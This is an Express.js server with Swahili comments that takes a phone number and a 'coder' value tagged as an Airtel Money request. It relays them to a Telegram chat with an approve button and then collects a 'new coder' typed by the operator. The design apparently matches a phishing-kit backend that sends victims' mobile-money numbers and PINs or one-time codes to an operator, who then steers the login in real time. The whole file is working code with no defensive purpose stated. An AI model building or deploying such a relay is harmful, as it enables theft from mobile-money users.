const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const app = express();
app.use(bodyParser.json());

const TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${TOKEN}`;

// Hii inahifadhi data ya kila ID kwa muda
let pendingApprovals = {};

// 1. Hii ndio inatuma ujumbe na button kwa Telegram
app.post('/send', async (req, res) => {
    const { number, coder, id } = req.body;

    // Hifadhi data
    pendingApprovals[id] = { number, coder };

    const text = `🔔 Ombi Jipya la Airtel Money\nNamba: ${number}\nCoder: ${coder}\nID: ${id}`;

    const keyboard = {
        inline_keyboard: [[
            { text: "✅ Approve", callback_data: `approve_${id}` }
        ]]
    };

    await axios.post(`${TELEGRAM_API}/sendMessage`, {
        chat_id: CHAT_ID,
        text: text,
        reply_markup: keyboard
    });

    res.send({ ok: true });
});

// 2. Hii ndio webhook ya Telegram
app.post('/telegram', async (req, res) => {
    const update = req.body;

    if (update.callback_query) {
        const callback = update.callback_query;
        const id = callback.data.split('_')[1];
        const data = pendingApprovals[id];

        // 1. JIBU TELEGRAM MARA MOJA - Hii ndio ilikua inakosekana
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: callback.id,
            text: "Inasubiri coder mpya..."
        });

        if (data) {
            // 2. Badilisha ujumbe na uondoe button
            await axios.post(`${TELEGRAM_API}/editMessageText`, {
                chat_id: callback.message.chat.id,
                message_id: callback.message.message_id,
                text: `🔔 Ombi Jipya la Airtel Money\n\nNamba: ${data.number}\nCoder: ${data.coder}\nID: ${id}\n\n✅ Imeapproved. Tuma coder mpya sasa:`
            });

            pendingApprovals[id].waitingForNewCoder = true;
        }
        return res.sendStatus(200);
    }

    // 3. Hii inashika ukituma coder mpya
    if (update.message && update.message.text) {
        const text = update.message.text;
        for(let id in pendingApprovals) {
            if(pendingApprovals[id].waitingForNewCoder) {
                const oldData = pendingApprovals[id];
                await axios.post(`${TELEGRAM_API}/sendMessage`, {
                    chat_id: CHAT_ID,
                    text: `✅ Coder mpya imewekwa!\nNamba: ${oldData.number}\nCoder Mpya: ${text}\nID: ${id}`
                });
                delete pendingApprovals[id]; // Futa
                break;
            }
        }
        return res.sendStatus(200);
    }

    res.sendStatus(200);
});

app.get('/', (req, res) => res.send('Bot is running'));
app.listen(10000, () => console.log('Running on port 10000'));
